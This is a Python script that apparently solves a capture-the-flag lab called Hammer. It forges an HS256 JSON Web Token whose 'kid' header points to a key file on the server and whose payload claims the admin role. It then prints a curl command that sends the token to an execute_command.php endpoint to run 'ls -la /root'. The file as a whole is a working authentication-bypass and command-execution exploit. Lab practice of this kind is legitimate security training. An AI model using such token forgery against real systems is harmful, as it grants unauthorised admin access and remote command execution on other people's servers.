import hmac
import hashlib
import base64
import json
import argparse
import time

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def forge_token(secret_key, key_path):
    header = {
        "typ": "JWT",
        "alg": "HS256",
        "kid": key_path
    }
    
    payload = {
        "iss": "http://hammer.thm",
        "aud": "http://hammer.thm",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
        "data": {
            "user_id": 1,
            "email": "tester@hammer.thm",
            "role": "admin"
        }
    }
    
    # Separators used to remove whitespace for standard JWT encoding
    encoded_header = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    encoded_payload = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    signature_input = f"{encoded_header}.{encoded_payload}".encode('utf-8')
    # Key is treated as string bytes
    signature = hmac.new(secret_key.encode('utf-8'), signature_input, hashlib.sha256).digest()
    encoded_signature = base64url_encode(signature)
    
    return f"{encoded_header}.{encoded_payload}.{encoded_signature}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Forge JWT for Hammer CTF")
    parser.add_argument("--key", required=True, help="Content of the secret key (188ade1.key)")
    parser.add_argument("--kid", default="/var/www/html/188ade1.key", help="Path to the key file on the server (kid)")
    
    args = parser.parse_args()
    
    token = forge_token(args.key, args.kid)
    print(f"\n[+] Forged Admin Token:\n{token}\n")
    print(f"[+] Curl Command to verify:")
    print(f"curl -s -X POST http://hammer.thm:1337/execute_command.php \\")
    print(f"     -H 'Authorization: Bearer {token}' \\")
    print(f"     -H 'Content-Type: application/json' \\")
    print(f"     -d '{{\"command\": \"ls -la /root\"}}'")
